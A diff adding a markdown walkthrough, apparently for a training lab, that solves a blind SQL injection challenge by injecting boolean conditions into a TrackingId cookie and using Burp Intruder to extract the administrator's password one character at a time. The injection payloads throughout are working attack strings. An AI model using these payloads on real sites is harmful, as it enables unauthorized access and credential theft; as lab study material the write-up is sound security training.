@@ -1,0 +1,28 @@
+## Solution steps
+
+- Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie.
+- Let's suppose the TrackingId=xyz
+- Modify the TrackingId cookie, changing it to: TrackingId=xyz' AND '1'='1
+- Observe that the Welcome back message appears in the response.
+- Change it to: TrackingId=xyz' AND '1'='2
+- Verify that the Welcome back message does not appear in the response.
+- It means only if the condition is true then the Welcome back message appears in the response.
+- Now change it to: TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
+- Verify that the condition is true, confirming that there is a table called users.
+- Now change it to: TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+- Verify that the condition is true, confirming that there is a user called administrator.
+- Determine how many characters are in the password of the administrator user: TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
+- This condition should be true, confirming that the password is greater than 1 character in length.
+- Using Burp repeater send a series of follow-up values to test different password lengths.
+- Observe at password>20 you receive an error which determines that password is 20 characters long.
+- After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use Burp Intruder. Send the request you are working on to Burp Intruder.
+- In Burp Intruder, change the value of the cookie to: TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
+- This uses the SUBSTRING() function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.
+- Place payload position markers around the final a character in the cookie value. To do this, select just the a, and click the Add § button.
+- You can assume that the password contains only lowercase alphanumeric characters. In the Payloads side panel, check that Simple list is selected, and under Payload configuration add the payloads in the range a - z and 0 - 9. You can select these easily using the Add from list drop-down.
+- To be able to tell when the correct character was submitted, you'll need to grep each response for the expression Welcome back. To do this, click on the  Settings tab to open the Settings side panel. In the Grep - Match section, clear existing entries in the list, then add the value Welcome back.
+- Start the attack.
+- Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the Intruder tab, and change the specified offset from 1 to 2 : TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
+- Launch the modified attack, review the results, and note the character at the second offset.
+- Continue this process testing offset until 20.
+- Use the password to log in as the administrator user.
